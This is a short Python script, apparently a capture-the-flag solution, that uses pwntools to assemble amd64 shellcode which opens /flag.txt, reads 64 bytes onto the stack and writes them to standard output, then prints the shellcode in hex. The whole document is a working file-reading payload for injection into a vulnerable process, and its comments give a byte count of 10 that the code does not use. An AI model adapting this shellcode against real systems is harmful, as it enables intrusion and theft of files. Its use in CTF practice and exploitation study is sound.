import os

os.environ["PWNLIB_NOTERM"] = "true"
import pwn

pwn.context.arch = "amd64"

a = pwn.asm(
    """
// open("/flag.txt", )
lea rdi, [flag+rip]
xorq rsi, rsi
mov rax, 2
syscall

// read(fd, somewhere, 10)
push rax
mov rdi, rax
mov rsi, rsp
movq rdx, 64
xor rax, rax
syscall

// write(fd, somewhere, 10)
mov rdi, 1
mov rsi, rsp
movq rdx, 64
movq rax, 1
syscall

flag:
.string "/flag.txt"
"""
)

print(a.hex())
